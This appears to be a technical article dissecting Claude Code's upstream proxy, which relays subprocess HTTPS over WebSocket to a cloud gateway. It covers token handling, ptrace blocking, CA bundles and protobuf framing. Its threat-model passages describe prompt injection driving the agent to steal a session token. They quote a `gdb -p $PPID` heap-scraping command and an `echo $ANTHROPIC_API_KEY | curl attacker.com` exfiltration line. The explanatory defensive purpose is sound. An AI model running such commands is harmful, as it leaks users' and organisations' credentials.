---
title: "The Upstream Proxy: How Claude Code Intercepts Subprocess HTTP Traffic"
description: "Claude Code relays subprocess HTTPS over WebSocket to a cloud gateway. Inside: anti-ptrace token defense, protobuf wire format, and dual-runtime TCP servers."
pubDate: 2026-04-08
tags: ["Claude Code", "Anthropic", "Architecture", "Security", "Networking"]
---

# The Upstream Proxy: How Claude Code Intercepts Subprocess HTTP Traffic

When Claude Code runs in a cloud container, every subprocess it spawns — `curl`, `gh`, `python`, `kubectl` — needs to reach external services. But the container sits behind an organization's security perimeter. The org needs to inject credentials (API keys, auth headers) into outbound HTTPS requests, log traffic for compliance, and block unauthorized endpoints. The subprocess doesn't know any of this. It just wants to `curl https://api.datadog.com`.

The naive solution: configure a corporate proxy and trust that every tool respects `HTTPS_PROXY`. But that only works if the tool trusts the proxy's TLS certificate. A corporate proxy that inspects HTTPS traffic presents its own certificate — a man-in-the-middle certificate that `curl` and `python` will reject unless they trust the issuing CA. Every runtime has its own CA trust store: Node uses `NODE_EXTRA_CA_CERTS`, Python uses `REQUESTS_CA_BUNDLE` or `SSL_CERT_FILE`, curl uses `CURL_CA_BUNDLE`, Go uses the system store. Miss one and the subprocess fails with `CERTIFICATE_VERIFY_FAILED`.

And there's a deeper problem. The container's ingress is a GKE L7 load balancer with path-prefix routing. It doesn't support raw HTTP CONNECT tunnels — the standard way proxies handle HTTPS. You can't just point `HTTPS_PROXY` at the ingress and expect CONNECT to work. The infrastructure needs a different transport.

Claude Code solves this with an **upstream proxy relay**: a local TCP server that accepts standard HTTP CONNECT requests from subprocesses, tunnels the bytes over WebSocket to the cloud gateway, and lets the gateway handle TLS interception and credential injection. The relay runs inside the container, bound to localhost, invisible to the agent. Subprocesses see a standard HTTPS proxy at `127.0.0.1:<port>` and a CA bundle that trusts both the system CAs and the gateway's MITM certificate.

This article traces every layer: the initialization sequence, the token lifecycle, the anti-ptrace defense, the CA certificate chain, the CONNECT-over-WebSocket protocol, the protobuf wire format, the NO_PROXY bypass list, and the subprocess environment injection that ties it all together.

---

## When Does This Activate?

The upstream proxy is a CCR (Cloud Code Runtime) feature. It only activates when three conditions are met:

```
function initUpstreamProxy():
    # Gate 1: Are we in a cloud container?
    if not env.CLAUDE_CODE_REMOTE:
        return disabled

    # Gate 2: Has the server enabled the proxy for this session?
    if not env.CCR_UPSTREAM_PROXY_ENABLED:
        return disabled

    # Gate 3: Do we have a session ID?
    if not env.CLAUDE_CODE_REMOTE_SESSION_ID:
        return disabled

    # Gate 4: Is there a session token on disk?
    token = readFile("/run/ccr/session_token")
    if not token:
        return disabled

    # All gates passed — proceed with initialization
    ...
```

The `CCR_UPSTREAM_PROXY_ENABLED` flag is evaluated server-side, where the feature flag system has warm caches. The container gets a fresh environment with no cached flags, so a client-side check would always return the default (false). The server makes the decision and injects the result into the container's environment.

Every subsequent step fails open: if anything goes wrong — CA download fails, relay can't bind, WebSocket connection breaks — the proxy is disabled and the session continues without it. A broken proxy setup must never break an otherwise-working session.

---

## The Token Lifecycle

The session token authenticates the relay to the cloud gateway. Its lifecycle is designed around a single threat: **prompt injection leading to token exfiltration**.

The attack scenario: Claude Code runs user-provided code. A malicious prompt tricks the model into executing a shell command that reads the token and sends it to an attacker-controlled server. With the token, the attacker can impersonate the session and access the organization's internal services through the proxy.

The defense is a four-step sequence:

### Step 1: Read the Token

```
token = readFile("/run/ccr/session_token")
```

The CCR orchestrator writes the token to a tmpfs mount at container startup. It's readable by the process user and exists only in memory-backed storage — never on a persistent disk.

### Step 2: Block ptrace

```
function setNonDumpable():
    if platform is not linux:
        return  # only Linux has prctl

    lib = dlopen("libc.so.6")
    PR_SET_DUMPABLE = 4
    lib.prctl(PR_SET_DUMPABLE, 0, 0, 0, 0)
```

This is the critical security step. `prctl(PR_SET_DUMPABLE, 0)` tells the Linux kernel that this process cannot be ptrace'd by any process running as the same UID. Without this, a prompt-injected command like `gdb -p $PPID -batch -ex 'find ...'` could attach to the Claude Code process, scan its heap, and extract the token from memory.

The call uses Bun's FFI (Foreign Function Interface) to directly invoke `prctl` from libc. It runs on Linux only; on other platforms it silently no-ops. If the FFI call itself fails (wrong libc path, missing symbol), it logs a warning and continues — fail-open, because blocking the entire session over a defense-in-depth measure would be wrong.

### Step 3: Start the Relay

The relay binds to localhost and begins accepting CONNECT requests. Only after the relay is confirmed listening does step 4 proceed.

### Step 4: Unlink the Token File

```
await unlink("/run/ccr/session_token")
# Token is now heap-only — file is gone
```

The token file is deleted from disk. The token now exists only in the process's heap memory, protected by `PR_SET_DUMPABLE`. A subprocess can't `cat /run/ccr/session_token` because the file no longer exists. It can't `gdb -p $PPID` because ptrace is blocked.

The ordering is deliberate: unlink happens AFTER the relay is confirmed up. If the CA download or relay startup fails, the token file remains on disk so a supervisor restart can retry the full initialization. Once the relay is running, the file is expendable.

Why not just use environment variables? Because environment variables are readable by any subprocess via `/proc/$PPID/environ`. The token would be trivially exfiltrable. The heap-only approach requires ptrace, which `PR_SET_DUMPABLE` blocks.

---

## The CA Certificate Chain

The cloud gateway terminates TLS on behalf of the real upstream server and presents its own certificate. Subprocesses need to trust this certificate. The system downloads the gateway's CA certificate and creates a merged bundle:

```
function downloadCaBundle(baseUrl, systemCaPath, outPath):
    # Download the gateway's CA cert from the Anthropic API
    response = fetch(baseUrl + "/v1/code/upstreamproxy/ca-cert",
                     timeout: 5000)
    if response not ok:
        return false  # fail-open: proxy disabled

    gatewayCa = response.text()

    # Read the system's existing CA bundle
    systemCa = readFile("/etc/ssl/certs/ca-certificates.crt")

    # Concatenate: system CAs first, gateway CA appended
    mkdir(dirname(outPath))
    writeFile(outPath, systemCa + "\n" + gatewayCa)
    # outPath = ~/.ccr/ca-bundle.crt
    return true
```

The merged bundle goes to `~/.ccr/ca-bundle.crt`. Subprocesses get this path via four environment variables, covering every major runtime's CA discovery mechanism:

| Variable | Runtime |
|----------|---------|
| `SSL_CERT_FILE` | curl, OpenSSL-based tools |
| `NODE_EXTRA_CA_CERTS` | Node.js |
| `REQUESTS_CA_BUNDLE` | Python requests/httpx |
| `CURL_CA_BUNDLE` | curl (alternative) |

The 5-second fetch timeout is deliberate. Bun has no default fetch timeout — without one, a hung CA endpoint would block CLI startup forever. 5 seconds is generous for a small PEM file.

---

## The CONNECT-over-WebSocket Relay

The relay is the core of the system. It translates standard HTTP CONNECT requests into WebSocket tunnels that the cloud gateway can route.

### Why WebSocket?

The CCR ingress is a GKE L7 load balancer with path-prefix routing. L7 load balancers inspect HTTP requests and route based on URL paths. HTTP CONNECT is a different protocol — it asks the proxy to establish a raw TCP tunnel, which L7 load balancers typically can't route. There's no `connect_matcher` in the CDK constructs.

WebSocket, however, is an HTTP upgrade — it starts as a normal HTTP request (routable by L7) and then upgrades to a bidirectional binary channel. The session ingress tunnel already uses this pattern. The upstream proxy follows suit.

### The Protocol

The relay listens on `127.0.0.1:0` (ephemeral port) and handles each connection through a two-phase state machine:

**Phase 1: CONNECT Accumulation**

```
function handleData(socket, state, data):
    if no WebSocket exists yet:
        # Accumulate bytes until we see the full CONNECT header
        state.connectBuf = concat(state.connectBuf, data)

        headerEnd = indexOf(state.connectBuf, "\r\n\r\n")
        if headerEnd is -1:
            # Guard: reject if header exceeds 8KB (not a real CONNECT)
            if length(state.connectBuf) > 8192:
                socket.write("HTTP/1.1 400 Bad Request\r\n\r\n")
                socket.end()
            return

        # Parse the CONNECT line
        firstLine = state.connectBuf[0:headerEnd].split("\r\n")[0]
        match = regex("CONNECT (\S+) HTTP/1.[01]", firstLine)
        if no match:
            socket.write("HTTP/1.1 405 Method Not Allowed\r\n\r\n")
            socket.end()
            return

        # Save any bytes that arrived after the header
        # (TCP can coalesce CONNECT + TLS ClientHello in one packet)
        trailing = state.connectBuf[headerEnd + 4:]
        if trailing is not empty:
            state.pending.push(trailing)

        openTunnel(socket, state, firstLine)
```

The 8KB guard prevents a misbehaving client from filling memory with a never-terminating header. The 405 response handles non-CONNECT methods — the relay only does CONNECT, not GET/POST. The trailing-bytes buffer handles TCP coalescing, where the client's CONNECT request and TLS ClientHello arrive in the same TCP segment.

**Phase 2: WebSocket Tunnel**

```
function openTunnel(socket, state, connectLine):
    # Open WebSocket to the cloud gateway
    ws = new WebSocket(wsUrl, {
        headers: {
            "Content-Type": "application/proto",
            "Authorization": "Bearer <session-token>"
        }
    })
    ws.binaryType = "arraybuffer"

    ws.onopen = ():
        # Send the CONNECT line + auth to the gateway
        head = connectLine + "\r\n"
             + "Proxy-Authorization: Basic <sessionId:token>\r\n"
             + "\r\n"
        ws.send(encodeChunk(head))

        # Flush any bytes buffered during WS handshake
        state.wsOpen = true
        for buf in state.pending:
            forwardToWs(ws, buf)
        state.pending = []

        # Start keepalive pings (30-second interval)
        state.pinger = setInterval(sendKeepalive, 30000, ws)

    ws.onmessage = (event):
        payload = decodeChunk(event.data)
        if payload and payload.length > 0:
            state.established = true
            socket.write(payload)

    ws.onerror = (event):
        if not state.established:
            socket.write("HTTP/1.1 502 Bad Gateway\r\n\r\n")
        socket.end()

    ws.onclose = ():
        socket.end()
```

There are two authentication layers. The WebSocket upgrade carries a `Bearer` token — the gateway requires session-level auth on the upgrade request itself (proto authn: PRIVATE_API). Inside the tunnel, the CONNECT request carries `Proxy-Authorization: Basic` with the session ID and token — this authenticates the specific tunnel and tells the gateway which target host:port to connect to.

### The Content-Type Trap

The WebSocket connection must set `Content-Type: application/proto`. Without it, the server's Go code treats the chunks as JSON and attempts `protojson.Unmarshal` on the hand-encoded binary — which silently fails with EOF, producing no error but also no tunnel. This was presumably discovered through debugging, not design.

### Keepalive

The sidecar proxy has a 50-second idle timeout. The relay sends an empty protobuf chunk (zero-length data field) every 30 seconds as an application-level keepalive. Not all WebSocket implementations expose `ping()`, so the empty chunk serves as a universal keepalive that the server can ignore.

### The Pending Buffer

Between parsing the CONNECT header and the WebSocket connection becoming open, bytes can keep arriving. The subprocess's TLS library doesn't wait for the proxy handshake — it can send the TLS ClientHello immediately after the CONNECT request, sometimes in the same TCP packet (kernel coalescing), sometimes in a separate data event that fires before `ws.onopen`.

Without buffering, these bytes would be silently dropped. The relay tracks a `pending` array: any data that arrives after the CONNECT parse but before `wsOpen` is true gets pushed to pending. When `onopen` fires, pending is flushed in order. This handles both sources of early data:

```
# TCP coalescing: CONNECT + ClientHello in one packet
data = [CONNECT api.example.com:443 HTTP/1.1\r\n\r\n][TLS ClientHello...]
                                                       ^--- trailing bytes → pending

# Async race: data event fires before onopen
ws = new WebSocket(...)   # handshake in flight
# ... socket data callback fires with TLS bytes ...
if not wsOpen:
    pending.push(data)    # buffered, not lost
```

### The WebSocket URL

The relay constructs the WebSocket URL from the API base URL with a simple transform:

```
wsUrl = baseUrl.replace("http", "ws") + "/v1/code/upstreamproxy/ws"
# https://api.anthropic.com → wss://api.anthropic.com/v1/code/upstreamproxy/ws
# http://localhost:8080     → ws://localhost:8080/v1/code/upstreamproxy/ws
```

The `replace` catches both `http→ws` and `https→wss` because the regex matches only the first occurrence. The server-side endpoint path mirrors the REST API namespace.

### The 502 Boundary

The relay only sends `HTTP/1.1 502 Bad Gateway` if the tunnel hasn't been established yet. Once the first server response has been forwarded (the `200 Connection Established`), the connection is carrying TLS. Writing a plaintext HTTP error into a TLS stream would corrupt the client's connection. After establishment, the relay just closes the socket silently.

A `closed` flag prevents double-end: the WebSocket `onerror` event is always followed by `onclose`, and without a guard, both handlers would call `socket.end()` on an already-ended socket. The first handler to fire sets `closed = true`; the second sees the flag and returns immediately.

---

## Two Runtimes, Two TCP Servers

Claude Code supports both Bun and Node as runtimes. The relay needs a TCP server, and the two runtimes have fundamentally different TCP APIs. Rather than abstracting behind a compatibility layer, the relay implements two complete server paths and dispatches at startup:

```
function startRelay(wsUrl, authHeader, wsAuthHeader):
    if typeof Bun is not undefined:
        return startBunRelay(wsUrl, authHeader, wsAuthHeader)
    else:
        return startNodeRelay(wsUrl, authHeader, wsAuthHeader)
```

### The Bun Path

Bun provides `Bun.listen()`, a callback-based TCP server where each connection gets an `open`, `data`, `drain`, `close`, and `error` handler. Connection state is stored directly on the socket's `data` property — no external map needed.

The critical difference is **write backpressure**. When you call `sock.write(bytes)` in Bun, it returns the number of bytes actually written to the kernel buffer. If the buffer is full, it returns less than the full length. The remaining bytes are **silently dropped** — Bun does not auto-buffer them.

The relay handles this with an explicit write queue per connection:

```
function bunWrite(socket, state, payload):
    bytes = toBytes(payload)

    # If there's already a backlog, just queue
    if state.writeBuf is not empty:
        state.writeBuf.push(bytes)
        return

    # Try writing directly
    n = socket.write(bytes)
    if n < bytes.length:
        # Partial write — queue the remainder
        state.writeBuf.push(bytes[n:])

# When the kernel buffer drains, Bun calls drain()
function drain(socket):
    while state.writeBuf is not empty:
        chunk = state.writeBuf[0]
        n = socket.write(chunk)
        if n < chunk.length:
            state.writeBuf[0] = chunk[n:]
            return  # still full, wait for next drain
        state.writeBuf.shift()
```

Without this, a fast upstream server sending data faster than the client can consume would silently lose bytes mid-TLS-stream — corrupting the connection with no error message.

### The Node Path

Node's `net.createServer()` takes a connection callback. Each connection is a `Socket` object with event emitters. Connection state is stored in a `WeakMap` keyed by the socket — when the socket is garbage-collected, the state goes with it.

Node's `sock.write()` is fundamentally different from Bun's: it **always buffers**. If the kernel buffer is full, `write()` returns `false` to signal backpressure, but the bytes are already queued internally. They will be flushed when the buffer drains. No explicit write queue is needed.

```
# Node path: write() auto-buffers, never drops bytes
adapter = {
    write: (payload) -> socket.write(toBuffer(payload)),
    end: () -> socket.end()
}
```

This is why the relay has two implementations rather than one: the core CONNECT parsing and WebSocket tunneling logic is shared (via `handleData` and `openTunnel`), but the TCP I/O layer has different correctness requirements. A single abstraction would either waste memory in Node (unnecessary write queue) or lose bytes in Bun (missing write queue).

### The Egress Proxy Problem

The CCR container sits behind an egress gateway — direct outbound connections are blocked. This creates a chicken-and-egg problem: the relay needs to open a WebSocket to the cloud gateway, but the WebSocket connection itself must go through the egress proxy.

Node's `undici.WebSocket` (the `globalThis.WebSocket` in Node) does **not** consult the global dispatcher for upgrade requests. So even though the process has `HTTPS_PROXY` configured, the WebSocket wouldn't use it. The relay works around this by using the `ws` package with an explicit proxy agent:

```
# Node path: preload ws package, pass explicit agent
WS = require("ws")
ws = new WS(wsUrl, {
    headers: { "Content-Type": "application/proto", Authorization: bearerToken },
    agent: getWebSocketProxyAgent(wsUrl),  # CONNECT through egress proxy
    tls: getWebSocketTLSOptions()          # mTLS certs if configured
})
```

The `ws` package is preloaded during `startNodeRelay()` — before any connection arrives — so that `openTunnel()` stays synchronous. If the `import('ws')` happened inside `openTunnel`, the CONNECT state machine would race: a second data event could fire while the import was awaiting, and the state would be inconsistent.

Bun's native `WebSocket` accepts a `proxy` URL directly as a constructor option — no agent needed. It also accepts a `tls` option for custom certificates. The Bun path is simpler because the runtime was designed for this:

```
# Bun path: proxy and TLS as constructor options
ws = new WebSocket(wsUrl, {
    headers: { "Content-Type": "application/proto", Authorization: bearerToken },
    proxy: getWebSocketProxyUrl(wsUrl),   # string, not an agent
    tls: getWebSocketTLSOptions()
})
```

Both paths honor mTLS configuration (client certificates set via `CLAUDE_CODE_CLIENT_CERT` and `CLAUDE_CODE_CLIENT_KEY`), so the relay works in enterprise environments that require mutual TLS for all outbound connections.

---

## The Protobuf Wire Format

Bytes between the relay and gateway are wrapped in protobuf messages:

```
message UpstreamProxyChunk {
    bytes data = 1;
}
```

The encoding is hand-written — no protobuf library, no code generation:

```
function encodeChunk(data):
    # Protobuf field 1, wire type 2 (length-delimited) → tag byte 0x0a
    # Tag = (field_number << 3) | wire_type = (1 << 3) | 2 = 10 = 0x0a

    # Varint-encode the length
    varint = []
    n = data.length
    while n > 0x7f:
        varint.push((n & 0x7f) | 0x80)
        n = n >>> 7
    varint.push(n)

    # Assemble: [0x0a] [varint length] [data bytes]
    out = new bytes(1 + varint.length + data.length)
    out[0] = 0x0a
    out[1..] = varint
    out[1+varint.length..] = data
    return out
```

Decoding is the reverse: verify the 0x0a tag, read the varint length, extract the payload. A shift exceeding 28 bits is rejected (guards against malformed varints). Zero-length chunks are valid (keepalive semantics).

Why hand-encode instead of using protobufjs? For a single-field bytes message, the hand encoding is 10 lines of code. A protobuf runtime library adds a dependency in the hot path — every byte of subprocess traffic passes through this encoder. The trade-off is clear: minimal code, no dependency, maximum throughput.

Large payloads are chunked at 512KB boundaries before encoding. This matches the Envoy per-request buffer cap at the gateway. Week-1 use cases (Datadog API calls) won't hit this limit, but the chunking is designed for future workloads like `git push` that could send megabytes through the tunnel.

---

## The NO_PROXY Bypass List

Not all traffic should go through the proxy. The bypass list is carefully curated:

```
NO_PROXY = [
    # Loopback
    "localhost", "127.0.0.1", "::1",

    # RFC1918 private ranges + AWS IMDS
    "169.254.0.0/16", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",

    # Anthropic API — three forms for cross-runtime compatibility
    "anthropic.com", ".anthropic.com", "*.anthropic.com",

    # GitHub (already reachable directly from CCR containers)
    "github.com", "api.github.com", "*.github.com", "*.githubusercontent.com",

    # Package registries
    "registry.npmjs.org", "pypi.org", "files.pythonhosted.org",
    "index.crates.io", "proxy.golang.org"
]
```

### Why Three Forms for Anthropic?

Different runtimes parse NO_PROXY differently:

- `*.anthropic.com` — Bun, curl, and Go interpret `*` as a glob wildcard
- `.anthropic.com` — Python urllib/httpx treats a leading dot as a suffix match (strips the dot, matches `*.anthropic.com`)
- `anthropic.com` — Apex domain fallback for runtimes that don't handle the above

All three are needed to cover the ecosystem of tools subprocesses might use.

### Why Bypass the Anthropic API?

The comment in the source is blunt: "the MITM breaks non-Bun runtimes." The proxy's MITM certificate is trusted by the merged CA bundle, but not all runtimes use `SSL_CERT_FILE`. Python's `certifi` package bundles its own CA store and ignores environment variables unless explicitly configured. A MITM'd connection to the Anthropic API from a Python subprocess would fail with `CERTIFICATE_VERIFY_FAILED`.

More importantly, the Anthropic API is Claude Code's own backend. There's no need for credential injection or traffic inspection on this path — the CLI already has its own authentication. Routing it through the proxy would add latency and failure modes for no benefit.

### Why Bypass Package Registries?

CCR containers already have direct network access to npm, PyPI, crates.io, and Go's module proxy. Routing package installs through the upstream proxy would add latency to `npm install` and `pip install` — commands the model runs frequently — for no security benefit. The registries don't need org credentials injected.

---

## Subprocess Environment Injection

The final layer connects everything. Every subprocess Claude Code spawns gets environment variables injected:

```
function subprocessEnv():
    # Get proxy vars (empty if proxy disabled or not in CCR)
    proxyEnv = getUpstreamProxyEnv()

    # If GHA secret scrubbing is enabled, strip sensitive vars
    if env.CLAUDE_CODE_SUBPROCESS_ENV_SCRUB:
        env = copy(process.env)
        env.merge(proxyEnv)
        for key in SCRUB_LIST:
            delete env[key]
            delete env["INPUT_" + key]  # GHA auto-creates INPUT_<NAME>
        return env

    # Normal case: process.env + proxy overlay
    return merge(process.env, proxyEnv)
```

The proxy env function is registered lazily. The `subprocessEnv` module has no static import of the upstream proxy module — this is deliberate. In non-CCR environments (local CLI, IDE integration), the proxy module graph (upstreamproxy + relay + WebSocket + FFI) is never loaded. The registration happens in `init` only when `CLAUDE_CODE_REMOTE` is set:

```
# In init, only when running in CCR:
registerUpstreamProxyEnvFn(getUpstreamProxyEnv)
initUpstreamProxy()
```

### The GHA Secret Scrubbing Layer

When running in GitHub Actions, a separate threat applies: prompt injection can exfiltrate secrets via shell expansion. A malicious prompt could trick the model into running `echo $ANTHROPIC_API_KEY | curl attacker.com -d @-`. The subprocess environment scrubber removes 20+ sensitive variables:

- **Anthropic auth**: API keys, OAuth tokens, custom headers
- **Cloud provider creds**: AWS secret keys, GCP credentials, Azure client secrets
- **GitHub Actions OIDC tokens**: Leaking these allows minting installation tokens — repo takeover
- **Actions runtime tokens**: Cache poisoning via artifact/cache API — supply-chain pivot
- **OTEL headers**: Often carry `Authorization: Bearer` tokens for monitoring backends

The scrub list explicitly does NOT include `GITHUB_TOKEN` and `GH_TOKEN`. These are job-scoped tokens that expire when the workflow ends. Wrapper scripts need them to call the GitHub API, and their short lifetime limits the blast radius.

The `INPUT_*` variant deletion handles a GitHub Actions quirk: the `with:` inputs in a workflow step are auto-duplicated as `INPUT_<NAME>` environment variables. `INPUT_ANTHROPIC_API_KEY` would survive the scrub of `ANTHROPIC_API_KEY` without this.

### Child CLI Inheritance

When Claude Code spawns a child CLI process (e.g., a subagent), the child can't re-initialize the relay — the token file was already unlinked. But the parent's relay is still running on localhost. The `getUpstreamProxyEnv` function detects this case:

```
function getUpstreamProxyEnv():
    if proxy not initialized locally:
        # Check if we inherited proxy vars from a parent process
        if env.HTTPS_PROXY and env.SSL_CERT_FILE are both set:
            # Pass through parent's proxy configuration
            return inherited proxy vars
        return {}

    # We own the relay — return our vars
    return {
        HTTPS_PROXY: "http://127.0.0.1:<port>",
        https_proxy: "http://127.0.0.1:<port>",
        NO_PROXY: <bypass list>,
        no_proxy: <bypass list>,
        SSL_CERT_FILE: "~/.ccr/ca-bundle.crt",
        NODE_EXTRA_CA_CERTS: "~/.ccr/ca-bundle.crt",
        REQUESTS_CA_BUNDLE: "~/.ccr/ca-bundle.crt",
        CURL_CA_BUNDLE: "~/.ccr/ca-bundle.crt",
    }
```

Both lowercase and uppercase variants are set for each variable. Some tools read `https_proxy`, others `HTTPS_PROXY`. Setting both ensures universal coverage.

Only HTTPS is proxied. The relay handles CONNECT (which is exclusively for HTTPS tunneling) and nothing else. Plain HTTP has no credentials to inject, and routing it through the relay would just produce a 405 error.

---

## Security Boundaries

The upstream proxy operates at the intersection of several trust boundaries:

**The model can't read the token.** The file is unlinked before the agent loop starts. The heap is non-dumpable. The token never appears in environment variables.

**Subprocesses can't reach arbitrary endpoints.** Traffic goes through the gateway, which can enforce allowlists and inject org credentials. The NO_PROXY list ensures local and already-authorized traffic bypasses the gateway.

**The proxy env vars are classified as dangerous.** In Claude Code's environment variable security model, `HTTPS_PROXY`, `SSL_CERT_FILE`, and `NODE_EXTRA_CA_CERTS` are NOT in the safe-vars list. Project-level settings files (`.claude/settings.json`) can't set them without a trust dialog — a malicious project could otherwise redirect traffic to an attacker's proxy and supply an attacker's CA certificate, enabling MITM of all subprocess HTTPS traffic. Only the upstream proxy system and user-level config can set them.

**Initialization fails open but fails loudly.** Every failure path logs a warning with the specific error. The session continues without the proxy, so users aren't blocked. But the debug logs make it clear why subprocess traffic isn't being proxied.

---

## Design Trade-offs

Several design decisions in the upstream proxy system reveal the constraints it operates under.

### Why Fail-Open Everywhere?

Every step of initialization — gate checks, token read, CA download, relay bind, prctl — fails open. If any step errors, the proxy is disabled and the session continues without it. This is the opposite of how most security systems work, where failure means "deny access."

The reasoning: the upstream proxy is an **infrastructure enhancement**, not a security gate. Its purpose is to inject credentials and log traffic for organizations. A session without the proxy still works — the agent can't reach org-internal services through the proxy, but it can still do everything else. Blocking the entire session because a CA endpoint was temporarily unreachable would be an availability regression for a feature the user didn't directly ask for.

The fail-open contract is maintained end-to-end. The `init` entry point wraps the entire `initUpstreamProxy()` call in a try-catch that logs and continues. Even if the module itself throws an unexpected error, the session starts.

### Why No Test Suite?

The upstream proxy has **no dedicated test files**. This is unusual for a security-sensitive component. The relay's source even exports `startNodeRelay` specifically so tests can exercise the Node path under Bun (with a comment explaining this), and the upstream proxy module exports `resetUpstreamProxyForTests()` — the hooks are there, but no tests exist yet.

The likely reason: the system is tightly coupled to infrastructure that's hard to simulate. The relay needs a WebSocket endpoint that speaks protobuf and responds with CONNECT establishment. The CA download hits a real HTTP endpoint. The prctl call needs Linux. The token lifecycle depends on tmpfs. Each piece works correctly in production but is expensive to mock in isolation. This is a testing debt that the exported test hooks suggest the team intends to pay down.

### Why Hand-Coded Protobuf Instead of gRPC?

The tunnel carries a single message type with a single bytes field. gRPC would add:
- A protobuf compiler step in the build pipeline
- A runtime library (~100KB+ for protobufjs)
- HTTP/2 framing that the L7 load balancer would need to support
- Code generation for a one-field message

The hand-coded encoder is 10 lines. The decoder is 12 lines. Both are trivially auditable. The trade-off breaks clearly in favor of hand-coding for this specific use case.

### Why Lazy Module Loading?

The upstream proxy module graph includes WebSocket libraries, Bun FFI bindings, node:net, and the relay state machine. In non-CCR environments (local CLI, IDE integrations), none of this is needed. A static import would load it unconditionally — adding startup latency and memory overhead for every user, even though fewer than 1% run in CCR containers.

The lazy-import pattern pushes this cost to zero for non-CCR users:

```
# In init, only when CLAUDE_CODE_REMOTE is set:
proxy = await import("upstreamproxy")
registerUpstreamProxyEnvFn(proxy.getUpstreamProxyEnv)
await proxy.initUpstreamProxy()
```

The subprocess environment module cooperates: it holds a function reference (`_getUpstreamProxyEnv`) that defaults to undefined. In non-CCR sessions, it's never registered, so `subprocessEnv()` returns `process.env` unmodified — no proxy module loaded, no overhead.

### Why Both Uppercase and Lowercase Env Vars?

The proxy sets both `HTTPS_PROXY` and `https_proxy`, both `NO_PROXY` and `no_proxy`. This isn't redundant — it's necessary. The ecosystem is split:

- **curl** prefers lowercase, falls back to uppercase
- **Python requests** checks uppercase first
- **Go's net/http** checks both, prefers `HTTPS_PROXY`
- **Node.js** (undici) checks lowercase first
- **Bun** checks lowercase first

Setting both ensures every tool in every runtime sees the proxy configuration without requiring users to set variables manually.

---

## Invisible by Design

The upstream proxy has no user-facing UI. No status bar indicator. No toast notification. No `--show-proxy-status` flag. No React component renders proxy state.

All proxy logging goes through a debug-only channel that writes to `~/.claude/debug/<session-id>.txt`. Users only see these messages if they start the CLI with `--debug` or enable it mid-session with `/debug`. The messages are tagged `[upstreamproxy]`:

```
[upstreamproxy] enabled on 127.0.0.1:49152
[upstreamproxy] relay listening on 127.0.0.1:49152
```

Or on failure:

```
[upstreamproxy] no session token file; proxy disabled
[upstreamproxy] ca-cert fetch 404; proxy disabled
[upstreamproxy] relay start failed: EADDRINUSE; proxy disabled
```

The user can verify the proxy is active by checking environment variables inside a subprocess:

```bash
env | grep HTTPS_PROXY   # http://127.0.0.1:<port>
env | grep SSL_CERT_FILE  # ~/.ccr/ca-bundle.crt
```

This invisibility is deliberate. The proxy is infrastructure plumbing for the container orchestrator, not a user feature. If it works, the user shouldn't notice it. If it fails, the session continues without it and the debug log explains what happened.

---

## The Full Round-Trip

Here's a single `curl` request traced through every function in the chain, from user action to response.

**Step 0: Initialization** (happens once at startup)

```
init()
  → [lazy import upstreamproxy module]
  → registerUpstreamProxyEnvFn(getUpstreamProxyEnv)
  → initUpstreamProxy()
    → isEnvTruthy("CLAUDE_CODE_REMOTE")         # gate 1
    → isEnvTruthy("CCR_UPSTREAM_PROXY_ENABLED")  # gate 2
    → readToken("/run/ccr/session_token")        # gate 3-4
    → setNonDumpable()                           # prctl via Bun FFI
    → downloadCaBundle(baseUrl, systemCaPath, outPath)
    → startUpstreamProxyRelay({ wsUrl, sessionId, token })
      → startBunRelay() or startNodeRelay()      # runtime dispatch
    → registerCleanup(() => relay.stop())
    → unlink(tokenPath)                          # token now heap-only
```

**Step 1: Model generates `curl https://api.datadog.com/v1/metrics`**

The Bash tool prepares to spawn the subprocess:

```
BashTool.executeCommand(command)
  → Shell.execute(command, { env: subprocessEnv(), ... })
    → subprocessEnv()
      → _getUpstreamProxyEnv()                   # registered function pointer
        → getUpstreamProxyEnv()                   # returns { HTTPS_PROXY, SSL_CERT_FILE, ... }
      → merge(process.env, proxyEnv)
    → spawn(binary, args, { env: mergedEnv })
```

The child `curl` process inherits `HTTPS_PROXY=http://127.0.0.1:49152` and `SSL_CERT_FILE=~/.ccr/ca-bundle.crt`.

**Step 2: curl sends CONNECT to the relay**

curl reads `HTTPS_PROXY`, opens a TCP connection to `127.0.0.1:49152`, and sends:

```
CONNECT api.datadog.com:443 HTTP/1.1
Host: api.datadog.com:443

```

The relay's TCP server fires:

```
[socket open]
  → newConnState()                               # { connectBuf, pending, wsOpen, established, closed }

[socket data: CONNECT header arrives]
  → handleData(adapter, state, data, ...)
    → Buffer.concat(state.connectBuf, data)
    → indexOf("\r\n\r\n")                        # found at end of header
    → regex match "CONNECT api.datadog.com:443 HTTP/1.1"
    → stash trailing bytes in state.pending
    → openTunnel(adapter, state, connectLine, ...)
      → new WebSocket(wsUrl, { headers, proxy/agent, tls })
```

**Step 3: WebSocket opens, CONNECT line forwarded to gateway**

```
ws.onopen()
  → encodeChunk(head)                            # head = CONNECT line + Proxy-Authorization
    → [0x0a, varint(length), ...bytes]           # protobuf wire encoding
  → ws.send(encodedChunk)
  → state.wsOpen = true
  → flush state.pending                          # TLS ClientHello if coalesced
    → forwardToWs(ws, buf)
      → encodeChunk(slice) for each 512KB chunk
      → ws.send(encodedChunk)
  → setInterval(sendKeepalive, 30000, ws)
```

**Step 4: Gateway responds with 200, curl proceeds with TLS**

```
ws.onmessage(event)
  → decodeChunk(raw)                             # verify 0x0a tag, read varint, extract payload
  → state.established = true                     # 502 boundary: no more plaintext errors
  → adapter.write(payload)                       # "HTTP/1.1 200 Connection Established\r\n\r\n"
```

curl sees the 200, starts TLS handshake through the tunnel. Every subsequent data event follows the same path: `handleData` → `forwardToWs` → `encodeChunk` → `ws.send` (client to server), and `ws.onmessage` → `decodeChunk` → `adapter.write` (server to client).

**Step 5: Cleanup when curl exits**

```
[socket close]
  → cleanupConn(state)
    → clearInterval(state.pinger)                # stop keepalive
    → state.ws.close()                           # close WebSocket
    → state.ws = undefined
```

**Step 6: Session shutdown**

```
gracefulShutdown()
  → runCleanupFunctions()
    → relay.stop()                               # registered during init
      → server.stop(true) [Bun] or server.close() [Node]
```

Every function in this chain is named. The total path from model output to subprocess response is: `BashTool.executeCommand` → `Shell.execute` → `subprocessEnv` → `getUpstreamProxyEnv` → `spawn` → [kernel TCP] → `handleData` → `openTunnel` → `encodeChunk` → [WebSocket] → [gateway] → `decodeChunk` → `adapter.write` → [kernel TCP] → curl.

---

## The Complete Sequence

